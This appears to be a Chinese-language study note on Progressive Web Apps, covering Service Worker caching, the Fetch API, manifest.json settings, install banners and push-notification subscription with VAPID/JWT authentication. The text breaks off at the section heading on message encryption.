# pwa-study

## 1. pwa基本介绍

### 1.1 概念

Progressive Web App, 简称 PWA，是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。

PWA 能做到原生应用的体验不是靠特指某一项技术，而是经过应用一些新技术进行改进，在安全、性能和体验三个方面都有很大提升，PWA 本质上是 Web App，借助一些新技术也具备了 Native App 的一些特性，兼具 Web App 和 Native App 的优点。


### 1.2 特性

1. 渐进式 - 适用于所有浏览器，因为它是以渐进式增强作为宗旨开发的
2. 连接无关性 - 能够借助 Service Worker 在离线或者网络较差的情况下正常访问
3. 类似应用 - 由于是在 App Shell 模型基础上开发，因为应具有 Native App 的交互和导航，给用户 Native App 的体验
4. 持续更新 - 始终是最新的，无版本和更新问题
5. 安全 - 通过 HTTPS 协议提供服务，防止窥探和确保内容不被篡改
6. 可索引 - 应用清单文件和 Service Worker 可以让搜索引擎索引到，从而将其识别为『应用』
7. 粘性 - 通过推送离线通知等，可以让用户回流
8. 可安装 - 用户可以添加常用的 webapp 到桌面，免去去应用商店下载的麻烦
9. 可链接 - 通过链接即可分享内容，无需下载安装



## 2. Service Workers

### 2.1 概念

W3C 组织早在 2014 年 5 月就提出过 Service Worker 这样的一个 HTML5 API ，主要用来做持久的离线缓存。


### 2.2 特性

1. 一个独立的 worker 线程，独立于当前网页进程，有自己独立的 worker context。

2. 一旦被 install，就永远存在，除非被 uninstall

3. 需要的时候可以直接唤醒，不需要的时候自动睡眠（有效利用资源，此处有坑）

4. 可编程拦截代理请求和返回，缓存文件，缓存的文件可以被网页进程取到（包括网络离线状态）

5. 离线内容开发者可控

6. 能向客户端推送消息

7. 不能直接操作 DOM

8. 出于安全的考虑，必须在 HTTPS 环境下才能工作

9. 异步实现，内部大都是通过 Promise 实现

### 2.3 Service Worker 生命周期

当用户首次导航至 URL 时，服务器会返回响应的网页。在图中，你可以看到在第1步中，当你调用 register() 函数时， Service Worker 开始下载。在注册过程中，浏览器会下载、解析并执行 Service Worker (第2步)。如果在此步骤中出现任何错误，register() 返回的 promise 都会执行 reject 操作，并且 Service Worker 会被废弃。

一旦 Service Worker 成功执行了，install 事件就会激活 (第3步)。Service Workers 很棒的一点就是它们是基于事件的，这意味着你可以进入这些事件中的任意一个。我们将在本书的第3章中使用这些不同的事件来实现超快速缓存技术。

一旦安装这步完成，Service Worker 便会激活 (第4步) 并控制在其范围内的一切。如果生命周期中的所有事件都成功了，Service Worker 便已准备就绪，随时可以使用了！

![Service Worker生命周期1](/images/sw1.png)
![Service Worker生命周期2](/images/sw2.png)


### 2.4 注册 Service Worker

```js
if ('serviceWorker' in navigator) {
    window.addEventListener('load', function () {
      navigator.serviceWorker.register('./sw.js', {scope: '/'})
        .then(function (registration) {

          // 注册成功
          console.log('ServiceWorker registration successful with scope: ', registration.scope);
        })
        .catch(function (err) {

          // 注册失败:(
          console.log('ServiceWorker registration failed: ', err);
        });
    });
  }
```

1. 首先是要判断 Service Worker API 的可用情况；

2. 如果支持的话，在页面 onload 的时候注册位于 /sw.js 的 Service Worker。

3. 每次页面加载成功后，就会调用 register() 方法，浏览器将会判断 Service Worker 线程是否已注册并做出相应的处理。

4. register 方法的 scope 参数是可选的，用于指定你想让 Service Worker 控制的内容的子目录。本 demo 中服务工作线程文件位于根网域， 这意味着服务工作线程的作用域将是整个来源。关于 register 方法的 scope 参数，需要说明一下：Service Worker 线程将接收 scope 指定网域目录上所有事项的 fetch 事件，如果我们的 Service Worker 的 javaScript 文件在 /a/b/sw.js， 不传 scope 值的情况下, scope 的值就是  /a/b。scope 的值的意义在于，如果 scope 的值为 /a/b， 那么 Service Worker 线程只能捕获到 path 为 /a/b 开头的( /a/b/page1, /a/b/page2，...)页面的 fetch 事件。通过 scope 的意义我们也能看出 Service Worker 不是服务单个页面的，所以在 Service Worker 的 js 逻辑中全局变量需要慎用。
   
5. then() 函数链式调用我们的 promise，当 promise resolve 的时候，里面的代码就会执行。

6. catch() 函数，当 promise rejected 才会执行。
    
代码执行完成之后，我们这就注册了一个 Service Worker，它工作在 worker context，所以没有访问 DOM 的权限。在正常的页面之外运行 Service Worker 的代码来控制它们的加载。


#### 2.4.1 查看是否注册成功

可以在 PC 上打开 chrome 浏览器, 输入 chrome://inspect/#service-workers

还可以通过 chrome://serviceworker-internals 来查看服务工作线程详情。 如果只是想了解服务工作线程的生命周期，这仍很有用，但是日后其很有可能被 chrome://inspect/#service-workers 完全取代。

当然，它还可用于测试隐身窗口中的 Service Worker 线程，您可以关闭 Service Worker 线程并重新打开，因为之前的 Service Worker 线程不会影响新窗口。从隐身窗口创建的任何注册和缓存在该窗口关闭后均将被清除。



#### 2.4.2 注册失败的原因

- 不是 HTTPS 环境，不是 localhost 或 127.0.0.1。

- Service Worker 文件的地址没有写对，需要相对于 origin。

- Service Worker 文件在不同的 origin 下而不是你的 App 的，这是不被允许的。



### 2.5  Service Workers 缓存

#### 2.5.1 在 Service Worker 安装过程中预缓存

当用户首次访问网站时，Service Worker 会开始下载并安装自身。在安装阶段中，我们可以进入这个事件，并准备缓存 Web 应用所需的所有重要资源。

在 Service Worker 安装阶段，我们可以获取资源并为下次访问准备好缓存;

代码进入了 install 事件，并在此阶段将 JavaScript 文件和 hello 图片添加到缓存中。在上面的清单中，我还引用了一个叫做 cacheName 的变量。这是一个字符串，我用它来设置缓存的名称。你可以为每个缓存取不同的名称，甚至可以拥有一个缓存的多个不同的副本，因为每个新的字符串使其唯一。当看到本章后面的版本控制和缓存清除时，你将会感受到它所带来的便利。

```js
var cacheName = 'helloWorld';
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open(cacheName)
      .then(cache => cache.addAll([
        '../images/sw3.png'
      ]))
  );
});

```

如果所有的文件都成功缓存了，那么 Service Worker 便会安装完成。如果任何文件下载失败了，那么安装过程也会随之失败。这点非常重要，因为它意味着你需要依赖的所有资源都存在于服务器中，并且你需要注意决定在安装步骤中缓存的文件列表。定义一个很长的文件列表便会增加缓存失败的几率，多一个文件便多一份风险，从而导致你的 Servicer Worker 无法安装。


现在我们的缓存已经准备好了，我们能够开始从中读取资源。我们需要添加代码，让 Service Worker 开始监听 fetch 事件。

```js
self.addEventListener('fetch', function (event) {  
  event.respondWith(
    caches.match(event.request)                    
    .then(function (response) {
      if (response) {                              
        return response;                           
      }
      return fetch(event.request);                 
    })
  );
});
```

使用 caches.match() 函数来检查传入的请求 URL 是否匹配当前缓存中存在的任何内容。如果存在的话，我们就简单地返回缓存的资源。但是，如果资源并不存在于缓存当中，我们就如往常一样继续，通过网络来获取资源

#### 2.5.2  拦截并缓存

在 Service Worker 安装期间缓存任何重要的资源，这被称之为“预缓存”。

因为 Service Workers 能够拦截 HTTP 请求，对于我们来说，这是发起请求然后将响应存储在缓存中的绝佳机会。这意味着我们改为先请求资源，然后立即缓存起来。这样一来，对于同样资源的发起的下一次 HTTP 请求，我们可以立即将其从 Service Worker 缓存中取出。


![Service Worker缓存](/images/sw3.png)

**对于发起的任何 HTTP 请求，我们可以检查资源是否在缓存中已经存在，如果没有的话再通过网络来获取**

先通过添加事件监听器来进入 fetch 事件。我们首先要做的就是检查请求的资源是否存在于缓存之中。如果存在，我们可以就此返回缓存并不再继续执行代码。

```js
var cacheName = 'helloWorld';                                
self.addEventListener('fetch', function (event) {            
  event.respondWith(
    caches.match(event.request)                              
    .then(function (response) {
      if (response) {                                        
        return response;
      }
      var requestToCache = event.request.clone();            
      return fetch(requestToCache).then(                     
        function (response) {
          if (!response || response.status !== 200) {        
            return response;
          }
          var responseToCache = response.clone();            
          caches.open(cacheName)                             
            .then(function (cache) {
              cache.put(requestToCache, responseToCache);    
            });
          return response;
        }
      );
    })
  );
});
```

然而，如果请求的资源于缓存之中没有的话，我们就按原计划发起网络请求。在代码更进一步之前，我们需要克隆请求。需要这么做是因为请求是一个流，它只能消耗一次。因为我们已经通过缓存消耗了一次，然后发起 HTTP 请求还要再消耗一次，所以我们需要在此时克隆请求。然后，我们需要检查 HTTP 响应，确保服务器返回的是成功响应并且没有任何问题。我们绝不想缓存一个错误的结果！

如果成功响应，我们会再次克隆响应。你可能会疑惑我们为什么需要再次克隆响应，请记住响应是一个流，它只能消耗一次。因为我们想要浏览器和缓存都能够消耗响应，所以我们需要克隆它，这样就有了两个流。

最后，代码中使用这个响应并将其添加至缓存中，以便下次再使用它。如果用户刷新页面或访问网站另一个请求了这些资源的页面，它会立即从缓存中获取资源，而不再是通过网络。


#### 2.5.3 对文件进行版本控制

更新缓存时可以使用两种方式。第一种方式，可以更新用来存储缓存的名称。第二种方式，就是实际上对文件进行版本控制。这种技术被称为“缓存破坏”，而且已经存在很多年了。当静态文件被缓存时，它可以存储很长一段时间，然后才能到期。如果期间你对网站进行更新，这可能会造成困扰，因为文件的缓存版本存储在访问者的浏览器中，它们可能无法看到所做的更改。通过使用一个唯一的文件版本标识符来告诉浏览器该文件有新版本可用，缓存破坏解决了这个问题。

- 缓存破坏背后的理念是每次更改文件时创建一个全新的文件名，这样以确保浏览器可以获取最新的内容。

```js
<script type="text/javascript" src="/js/main-xtvbas65.js"></script>
```

#### 2.5.4 处理额外的查询参数

当 Service Worker 检查已缓存的响应时，它使用请求 URL 作为键。默认情况下，请求 URL 必须与用于存储已缓存响应的 URL 完全匹配，包括 URL 查询部分的任何字符串。

如果对文件发起的 HTTP 请求附带了任意查询字符串，并且查询字符串会更改，这可能会导致一些问题。例如，如果你对一个先前匹配的 URL 发起了请求，则可能会发现由于查询字符串略有不同而导致该 URL 找不到。当检查缓存时想要忽略查询字符串，使用 ignoreSearch 属性并设置为 true 。


```js
self.addEventListener('fetch', function (event) {
  event.respondWith(
    caches.match(event.request, {
      ignoreSearch: true
    }).then(function (response) {
      return response || fetch(event.request);
    })
  );
});

```

ignoreSearch 选项来忽略请求参数和缓存请求的 URL 的查询部分。你可以通过使用其他忽略选项 (如 ignoreMethod 和 ignoreVary) 进一步扩展。例如，ignoreMethod 选项会忽略请求参数的方法，所以 POST 请求可以匹配缓存中的 GET 项。ignoreVary 选项会忽略已缓存响应中的 vary 首部。


#### 2.5.5 Servicer Worker toolbox

[Service Worker toolbox](https://github.com/GoogleChrome/sw-toolbox)。它是由 Google 团队编写的，它是一个辅助库，以使你快速开始创建自己的 Service Workers，内置的处理方法能够涵盖最常见的网络策略。只需短短几行代码，你就可以决定是否只是要从缓存中提供指定资源，或者从缓存中提供资源并提供备用方案，或者只能从网络返回资源并且永不缓存。这个库可以让你完全控制缓存策略。

```js
importScripts('/sw-toolbox/sw-toolbox.js');          

toolbox.router.get('/css/(.*)', toolbox.cacheFirst);
```

先使用 importScripts 函数导入 Service Worker toolbox 库。Service Workers 可以访问一个叫做 importScripts() 的全局函数，它可以将同一域名下脚本导入至它们的作用域。这是将另一个脚本加载到现有脚本中的一种非常方便的方法。它保持代码整洁，也意味着你只需要在需要时加载文件。

一旦脚本导入后，我们就可以开始定义想要缓存的路由。定义了一个路由，它匹配路径是 /css/，并且永远使用缓存优选的方式。这意味着资源会永远从缓存中提供，如果不存在的话再回退成通过网络获取。Toolbox 还提供了一些其他内置缓存策略，比如只通过缓存获取、只通过网络获取、网络优先、缓存 优先或者尝试从缓存或网络中找到最快的响应。每种策略都可以应用于不同的场景，甚至你可以混用不同的路由来匹配不同的策略，以达到最佳效果。

Service Worker toolbox 还为你提供了预缓存资源的功能。在 Service Worker 安装期间预缓存了资源，我们可以使用 Service Worker toolbox 以同样的方式来实现，并且只需要一行代码。

```js
toolbox.precache(['/js/script.js', '/images/hello.png']);
```

在 Service Worker 安装步骤中应该被缓存的 URL 数组。这行代码会确保在 Service Worker 安装阶段资源被缓存。


## 3. Fetch 

### 3.1 Fetch API 

1. get请求

```js
fetch('/some/url', {           
  method: 'GET'
}).then(function (response) {  
  // 成功
}).catch(function (err) {      
  // 出问题了
});
```

2. post请求

```js
fetch('/some/url', {                            
    method: 'POST',
    headers: {
      'auth': '1234'                            
    },
    body: JSON.stringify({                      
      name: 'dean',
      login: 'dean123',
    })
  })
  .then(function (data) {                       
    console.log('Request success: ', data);
  })
  .catch(function (error) {                     
    console.log('Request failure: ', error);
  });
```


想在不支持的浏览器上使用的话，你可能要考虑使用 polyfill 。


### 3.2 Fetch 事件

通过监听 fetch 事件的触发来拦截任何 HTTP 请求

```js
self.addEventListener('fetch', function (event) {                                        
  if (/\.jpg$/.test(event.request.url)) {                                                
    event.respondWith(
      new Response('<p>This is a response that comes from your service worker!</p>', {
        headers: { 'Content-Type': 'text/html' }                                         
      });
    );
  }
});
```



### 3.3 save-data

一些现代浏览器可以“选择性加入”功能以允许用户节省数据。如果启用此功能，浏览器会为每个 HTTP 请求添加一个新的首部，使用 Service Workers 可以进入 fetch 事件并决定是否返回网站的“轻量级”版本

```js
this.addEventListener('fetch', function (event) {

  if(event.request.headers.get('save-data')){
    // 我们想要节省数据，所以限制了图标和字体
    if (event.request.url.includes('fonts.googleapis.com')) {
        // 不返回任何内容
        event.respondWith(new Response('', {status: 417, statusText: 'Ignore fonts to save data.' }));
    }
  }
});

```

## 4. 添加至首屏

### 4.1 manifest.json

#### 4.1.1 概述

PWA 添加至桌面的功能实现依赖于 manifest.json。PWA 添加到主屏幕的不仅仅是一个网页快捷方式，它将提供更多的功能，让 PWA 具有更加原生的体验。

为了实现 PWA 应用添加至桌面的功能，除了要求站点支持 HTTPS 之外，还需要准备 manifest.json 文件去配置应用的图标、名称等信息。

```json
{
    "short_name": "短名称",
    "name": "这是一个完整名称",
    "icon": [
        {
            "src": "icon.png",
            "type": "image/png",
            "sizes": "48x48"
        }
    ],
    "start_url": "index.html"
}
```


使用 link 标签将 manifest.json 部署到 PWA 站点 HTML 页面的头部，如下所示：

```html
<link rel="manifest" href="path-to-manifest/manifest.json">
```

#### 4.1.2. 基本功能

##### 4.1.2.1 自定义名称

PWA在通过应用安装横幅引导用户安装 app，以及被添加到主屏幕时，需要显示应用名称以便用户将其与其他应用区分开来。对应的属性为：

- name: {string} 应用名称，用于安装横幅、启动画面显示
- short_name: {string} 应用短名称，用于主屏幕显示

所以用两个字段做区分，是由于显示在主屏幕的应用名称长度有限，超长部分会被截断并显示省略号，需要设置较短的应用名称优化显示；而安装横幅没有长度限制，可以将完整的应用名称显示出来。

##### 4.1.2.2 自定义图标

当用户将 PWA 添加至主屏幕时，会如同原生应用一样显示应用名和图标。我们可以通过 icons 属性定义一组不同大小的图标供浏览器进行选择。

- icons: {Array.<ImageObject>} 应用图标列表

其中 ImageObject 的属性值包括：

- src: {string} 图标 url
- type {string=} 图标的 mime 类型，非必填项，该字段可让浏览器快速忽略掉不支持的图标类型
- sizes {string} 图标尺寸，格式为widthxheight，宽高数值以 css 的 px 为单位。如果需要填写多个尺寸，则使用空格进行间隔，如"48x48 96x96 128x128"

当PWA添加到主屏幕时，浏览器会根据有效图标的 sizes 字段进行选择。首先寻找与显示密度相匹配并且尺寸调整到 48dp 屏幕密度的图标；如果未找到任何图标，则会查找与设备特性匹配度最高的图标；如果匹配到的图标路径错误，将会显示浏览器默认 icon。


##### 4.1.2.3 设置启动网址

当PWA添加到主屏幕后，需要通过 start_url 去指定应用打开的网址。

- start_url: {string=} 应用启动地址
如果该属性为空，则默认使用当前页面，这可能不是用户想要的内容，因此建议配置 start_url；如果 start_url 配置的相对地址，则基地址与 manifest.json 相同。

##### 4.1.2.4 设置作用域

对于一些大型网站而言，有时仅仅对站点的某些模块进行 PWA 改造，其余部分仍为普通的网页。因此需要通过 scope 属性去限定作用域，超出范围的部分会以浏览器的方式显示。

- scope: {string} 作用域

scope 应遵循如下规则：

- 如果没有在 manifest 中设置 scope，则默认的作用域为 manifest.json 所在文件夹；
- scope 可以设置为 ../ 或者更高层级的路径来扩大PWA的作用域；
- start_url 必须在作用域范围内；
- 如果 start_url 为相对地址，其根路径受 scope 所影响；
- 如果 start_url 为绝对地址（以 / 开头），则该地址将永远以 / 作为根地址；


#### 4.2 改善应用体验

#### 4.2.1 添加启动画面

当 PWA 从主屏幕点击打开时，幕后执行了若干操作：

1. 启动浏览器
2. 启动显示页面的渲染器
3. 加载资源

在这个过程中，由于页面未加载完毕，因此屏幕将显示空白并且看似停滞。如果是从网络加载的页面资源，白屏过程将会变得更加明显。因此 PWA 提供了启动画面功能，用标题、颜色和图像组成的画面来替代白屏，提升用户体验。

#### 4.2.2 设置图像和标题

浏览器会从 icons 中选择最接近 128dp 的图片作为启动画面图像。标题则直接取自 name。

#### 4.2.3 设置启动背景颜色

通过设置 background_color 属性可以指定启动画面的背景颜色。

- background_color: {Color} css色值


#### 4.2.4 设置启动显示类型

仅当显示类型 display 设置为 standalone 或 fullscreen 时，PWA 启动的时候才会显示启动画面。


#### 4.2.5 设置显示类型

可以通过设置 display 属性去指定 PWA 从主屏幕点击启动后的显示类型。

- display: {string} 显示类型
显示类型的值包括以下四种：

|显示类型	|描述|降级显示类型|
|-------|----------|-------|
|fullscreen|	应用的显示界面将占满整个屏幕 |standalone|
|standalone	|浏览器相关UI（如导航栏、工具栏等）将会被隐藏	 |minimal-ui|
|minimal-ui	|显示形式与standalone类似，浏览器相关UI会最小化为一个按钮，不同浏览器在实现上略有不同 |browser|
|browser	|浏览器模式，与普通网页在浏览器中打开的显示一致	|(None)|


> CSS中可以通过 display-mode 这个媒体查询条件去指定在不同的显示类型下不同的显示样式，如：

```css
@media all and (display-mode: fullscreen) {
    body {
        margin: 0;
    }
}

@media all and (display-mode: standalone) {
    body {
        margin: 1px;
    }
}

@media all and (display-mode: minimal-ui) {
    body {
        margin: 2px;
    }
}

@media all and (display-mode: browser) {
    body {
        margin: 3px;
    }
}
```

#### 4.2.6 指定页面显示方向

PWA允许应用通过设置 orientation 属性的值，强制指定显示方向。

- orientation: string 应用显示方向

orientation属性的值有以下几种：

- landscape-primary
- landscape-secondary
- landscape
- portrait-primary
- portrait-secondary
- portrait
- natural
- any

由于不同的设备的宽高比不同，因此对于“横屏”、“竖屏”不能简单地通过屏幕旋转角去定义。如对于手机来说，90° 和 270° 为横屏，而在某些平板电脑中，0° 和 180° 才是横屏。因此需要通过应用视窗去定义。

- 当视窗宽度大于高度时，当前应用处于“横屏”状态。横屏分为两种角度，两者相位差为 180°，分别为 landscape-primary 和 landscape-secondary。
- 当视窗宽度小于等于高度时，当前应用处于“竖屏”状态。同样，竖屏分为两种，两者相位差为 180°，分别为 portrait-primary 和 portrait-secondary。

有了 landscape-primary、landscape-secondary、portrait-primary、portrait-secondary 的定义，我们就可以用它们来定义其他的属性值了。

- landscape: 根据不同平台的规则，该值可等效于 landscape-primary 或 landscape-secondary，或者根据当前屏幕旋转角不同，去自由切换 landscape-primary 或 landscape-secondary；
- portrait: 根据不同平台的规则，该值可等效于 portrait-primary 或 portrait-secondary，或者根据当前屏幕旋转角不同，去自由切换 portrait-primary 或 portrait-secondary；
- natural: 根据不同平台的规则，该值可等效于 portrait-primary 或 landscape-primary，即当前屏幕旋转角为 0° 时所对应的显示方向；
- any: 根据屏幕旋转角自由切换 landscape-primary、landscape-secondary、portrait-primary、portrait-secondary。


#### 4.2.7 设置主题颜色


通过设置 theme_color 属性可以指定 PWA 的主题颜色。可以通过该属性来控制浏览器 UI 的颜色。比如 PWA 启动画面上状态栏、内容页中状态栏、地址栏的颜色，会被 theme_color 所影响。

- theme_color: {Color} css色值
对于当前版本的 Chrome 浏览器，在 browser 显示类型下，内容页的状态栏、地址栏并不会显示成 theme_color 所指定的颜色。


在指定了 theme_color 的值之后，地址栏依然呈白色。针对这种情况，可以在页面 HTML 里设置 name 为 theme-color 的 meta 标签，例如：

```html
<meta name="theme-color" content="green">
```

## 4.3. 应用添加横幅

PWA 提供两种添加应用横幅的形式，分别实现引导用户添加 PWA 至桌面和引导用户下载原生应用的功能。

### 4.3.1. 引导用户添加应用至主屏幕

打开浏览器菜单，会看到添加到主屏幕的功能，用户可以点击该选项手动将 PWA 站点添加至主屏幕。

#### 4.3.1.1 显示应用安装横幅的条件

- 站点部署 manifest.json，该文件需配置如下属性：

    + short_name （用于主屏幕显示）
    + name （用于安装横幅显示）
    + icons （其中必须包含一个 mime 类型为 image/png 的图标声明）
    + start_url （应用启动地址）
    + display （必须为 standalone 或 fullscreen）

- 站点注册 Service Worker。
- 站点支持 HTTPS 访问。
- 站点在同一浏览器中被访问至少两次，两次访问间隔至少为 5 分钟。


#### 4.3.1.2 应用安装横幅事件

1. 判断用户是否安装此应用

beforeinstallprompt 事件返回一个名为 userChoice 的 Promise 对象，并在当用户对横幅进行操作时进行解析。promise 会返回属性 outcome，该属性的值为 dismissed 或 accepted，如果用户将网页添加到主屏幕，则返回 accepted。

```js
window.addEventListener('beforeinstallprompt', function (e) {
    // beforeinstallprompt event fired

    e.userChoice.then(function (choiceResult) {
        if (choiceResult.outcome === 'dismissed') {
            console.log('用户取消安装应用');
        }
        else {
            console.log('用户安装了应用');
        }
    });
});
```

2. 取消或延迟安装横幅的触发事件

网站虽然不能主动触发安装横幅的显示事件，但是当该事件被浏览器触发之后，可以对其进行取消或者延迟。

通过阻止 beforeinstallprompt 事件的默认行为，即可取消横幅弹出：

```js
window.addEventListener('beforeinstallprompt', function (e) {
    e.preventDefault();
    return false;
});
```

beforeinstallprompt 事件返回一个名为 prompt 的方法，通过执行该方法可以触发安装横幅的显示。为了实现显示事件的延迟操作，可以将 beforeinstallprompt 事件的返回值给存储起来，再异步地调用 prompt()。


```js
var deferredPrompt = null;

window.addEventListener('beforeinstallprompt', function (e) {
    // 将事件返回存储起来
    deferredPrompt = e;

    // 取消默认事件
    e.preventDefault();
    return false;
});

// 当按钮点击事件触发的时候，再去触发安装横幅的显示
button.addEventListener('click', function () {
    if (deferredPrompt != null) {
        // 异步触发横幅显示
        deferredPrompt.prompt();
        deferredPrompt = null;
    }
});
```


通过 prompt() 触发显示的横幅，同样可以通过 userChoice 去监测用户的安装行为：

```js
button.addEventListener('click', function () {
    if (deferredPrompt != null) {
        // 异步触发横幅显示
        deferredPrompt.prompt();
        // 检测用户的安装行为
        deferredPrompt.userChoice.then(function (choiceResult) {
            console.log(choiceResult.outcome);
        });

        deferredPrompt = null;
    }
});
```


### 4.3.2. 引导用户安装原生应用

#### 4.3.2.1 显示原生应用安装横幅的条件

- 站点部署 manifest.json，该文件需配置如下属性：

    + short_name （用于主屏幕显示）
    + name （用于安装横幅显示）
    + icons （其中必须包含一个 192x192 且 mime 类型为 image/png 的图标声明）
    + 包含原生应用相关信息的 related_applications 对象

- 站点注册 Service Worker。
- 站点支持 HTTPS 访问。
= 站点在同一浏览器中被访问至少两次，两次访问间隔至少为 2 天。

其中 related_applications 的定义如下：

- related_applications: Array.<AppInfo> 关联应用列表
AppInfo 的属性值包括：

- platform: {string} 应用平台
- id: {string} 应用id

例如：

```json
"related_applications": [
    {
        "platform": "play",
        "id": "com.baidu.samples.apps.iosched"
    }
]
```

如果只希望用户安装原生应用，而不需要弹出横幅引导用户安装 PWA，那么可以在 manifest.json 设置：

```json
"prefer_related_applications": true
```


## 5. 推送通知

消息推送有着十分广阔的应用场景：

新品上架，推送消息给用户，点击即进入商品详情页面。
用户很久没有进入站点了，推送消息告知这段时间站点的更新。
使用推送消息通知，能够让我们的应用像 Native App 一样，提升用户体验。

但是目前整体支持度并不高，在手机端更是只有安卓 Chrome57 支持。

### 5.1 获取授权

在订阅消息之前，浏览器需要得到用户授权，同意后才能使用消息推送服务。

![avatar](/images/ask-permission.png)

显示以上对话框有两种方式：

1. 在订阅之前先获取用户授权，使用Notification.requestPermission

2. 如果不选择使用方法1，在正式订阅时浏览器也会自动弹出，对于开发者而言不需要显式调用

- 在第一种使用Notification.requestPermission的方式中，由于通知API还不稳定，需要兼容新旧版本的返回值：

```js
function askPermission() {
    return new Promise(function (resolve, reject) {
        var permissionResult = Notification.requestPermission(function (result) {
            // 旧版本
            resolve(result);
        });
        if (permissionResult) {
            // 新版本
            permissionResult.then(resolve, reject);
        }
    })
    .then(function (permissionResult) {
        if (permissionResult !== 'granted') {
            // 用户未授权
        }
    });
}
```

当用户允许或者拒绝授权后，后续都不会重复询问。 想要更改这个设置，在 Chrome 地址栏左侧网站信息中如下：

![avatar](/images/change-permission.png)


### 5.2 订阅推送服务

服务端作为消息来源，委托推送服务发送消息给订阅消息的浏览器，必须知道浏览器的具体地址。这个具体的地址是推送服务产生的，不同的服务端和不同的浏览器都会产生不同的地址。那么在订阅时服务端（也就是我们的应用）就需要一个唯一标识的身份。


#### 5.2.1 applicationServerKey

又被称作VAPID，这就是我们应用的唯一标识。生成applicationServerKey的方法有两种：

1. 在服务端使用 web-push 生成，在后续使用web-push发送消息一节中会详细介绍

2. 访问https://web-push-codelab.appspot.com/快速生成


此时得到的applicationServerKey是base64编码后的字符串，需要转换成UInt8Array格式，才能作为订阅方法接受的参数。

另外要注意，生成applicationServerKey的同时，会同时生成与之配对的私钥，用于后续服务端请求推送服务的安全验证（详见后续消息推送安全性一节），因此这个私钥是绝对不能暴露在页面中的




#### 5.2.2 推送订阅对象

拥有了服务端的唯一标识，浏览器可以开始向推送服务发起订阅请求了，有两点要注意：

请求推送服务的地址对于开发者而言是无法指定的，完全由浏览器决定。
在请求发送之前，浏览器已经生成了一个推送订阅对象(PushSubscription)。得到响应之后，会将推送服务生成的地址加入这个推送订阅对象中。
一个完整的推送订阅对象结构如下


```json
{
    "endpoint": "https://fcm.googleapis.com/fcm/send/...",
    "keys": {
        "p256dh" : "BNcRd...",
        "auth"   : "tBHI..."
    }
}
```


其中endpoint就是推送服务返回的唯一标识用户设备的地址，而keys是浏览器预先生成的，包含了用于安全验证信息，在后续向推送服务发送消息时会使用到（详见后续消息推送安全性一节）。


#### 5.2.3 订阅消息的具体实现

订阅消息的具体实现步骤如下：

1. 注册 Service Worker

2. 使用 pushManager 添加订阅，浏览器向推送服务发送请求，其中传递参数对象包含两个属性：

    - userVisibleOnly，不允许静默的推送，所有推送都对用户可见，所以值为true
    -capplicationServerKey，服务器生成的公钥
    
3. 得到推送服务成功响应后，浏览器将推送服务返回的 endpoint 加入推送订阅对象，向服务器发送这个对象供其存储

以上步骤对应的具体代码实现如下：


```js
// 将base64的applicationServerKey转换成UInt8Array
function urlBase64ToUint8Array(base64String) {
    var padding = '='.repeat((4 - base64String.length % 4) % 4);
    var base64 = (base64String + padding)
        .replace(/\-/g, '+')
        .replace(/_/g, '/');
    var rawData = window.atob(base64);
    var outputArray = new Uint8Array(rawData.length);
    for (var i = 0, max = rawData.length; i < max; ++i) {
        outputArray[i] = rawData.charCodeAt(i);
    }
    return outputArray;
}
function subscribe(serviceWorkerReg) {
    serviceWorkerReg.pushManager.subscribe({ // 2. 订阅
        userVisibleOnly: true,
        applicationServerKey: urlBase64ToUint8Array('<applicationServerKey>')
    })
    .then(function (subscription) {
        // 3. 发送推送订阅对象到服务器，具体实现中发送请求到后端api
        sendEndpointInSubscription(subscription);
    })
    .catch(function () {
        if (Notification.permission === 'denied') {
            // 用户拒绝了订阅请求
        }
    });
}
if ('serviceWorker' in navigator && 'PushManager' in window) {
    navigator.serviceWorker.register('./service-worker.js')  // 1. 注册Service Worker
        .then(function(reg) {});
    navigator.serviceWorker.ready.then(function(reg) {subscribe(reg)});
}
```


#### 5.2.4 非标准浏览器


如果订阅时第二步pushManager.subscribe()中缺少了applicationServerKey参数，我们会得到这样的错误信息：

[!错误信息](/images/missing-aSK.png)

missing-applicationServerKey

错误信息中前半段显而易见，但后半段中提到的gcm_sender_id是什么呢？

GCM(Google Cloud Messaging)是 Google 早期的推送服务，现已更名为 FCM(Firebase Cloud Messaging)，对于旧版本的 Chrome 浏览器，gcm_sender_id相当于applicationServerKey。

如果开发者想兼容这些老版本的浏览器，那么可以参考[非标准浏览器的兼容措施](https://web-push-book.gauntface.com/chapter-06/01-non-standards-browsers/)


#### 5.2.5 取消订阅

某些情况下，例如服务端请求推送服务，返回了推送服务失效错误码，此时需要取消订阅，代码实现如下：

```js
navigator.serviceWorker.ready.then(function (reg) {
    reg.pushManager.getSubscription()
        .then(function (subscription) {
            subscription.unsubscribe()
                .then(function (successful) {
                    //
                })
                .catch(function (e) {
                    //
                });
        });
});
```

### 5.3 发送消息

所有推送服务都遵循统一的调用标准，好比快递公司有着全国统一的上门服务电话，这就是 [Web Push Protocol](https://tools.ietf.org/html/draft-ietf-webpush-protocol) 。

推送服务接到了服务器的调用请求，向设备推送消息，如果处于离线状态，消息将进入待发送队列，过期后队列清空，消息被丢弃。

下面介绍保证消息安全的原理，以及在实际使用中服务端的具体代码实现。


#### 5.3.1 消息推送安全性


消息推送的安全体现在两方面：

- 推送服务确保调用来自可靠的服务端

- 推送消息内容只有浏览器能够解密，就算是推送服务也不行

##### 5.3.1.1 保证服务端可靠性

服务器在调用推送服务时，需要额外发送请求头，例如 Authorization 和 Crypto-Key，首先介绍 Authorization。

> [JWT(JSON Web Token)](https://jwt.io/)提供了一种消息接收者验证发送者的方法。


Authorization 就包含了 JWT 格式的字符串： Authorization: 'WebPush <JWT Info>.<JWT Data>.<Signature>'

Authorization 的内容由三部分组成，使用.连接，前两部分是使用base64编码后的JSON字符串：

- JWT Info，指明了签名使用的加密算法

```json
{
    "typ": "JWT",
    "alg": "ES256"
}
```

- JWT Data，包含发送者的信息，推送服务的源地址，失效时间，和发送者的联系方式

```json
{
    "aud": "https://some-push-service.org",
    "exp": "1469618703",
    "sub": "mailto:example@web-push-book.org"
}
```

- 签名，连接前两部分，服务端使用私钥加密。还记得之前添加订阅的时候，使用到的服务端生成的公钥吗，此处使用的正是与之配对的私钥


另外，请求头中还需要将公钥带给推送服务： Crypto-Key: p256ecdsa=<URL Safe Base64 Public Application Server Key>


这样，当推送服务收到服务端的调用请求时，使用公钥解密 Authorization 签名部分，如果匹配前两部分，说明请求来自可靠的服务端。


##### 5.3.1.2 消息内容加密


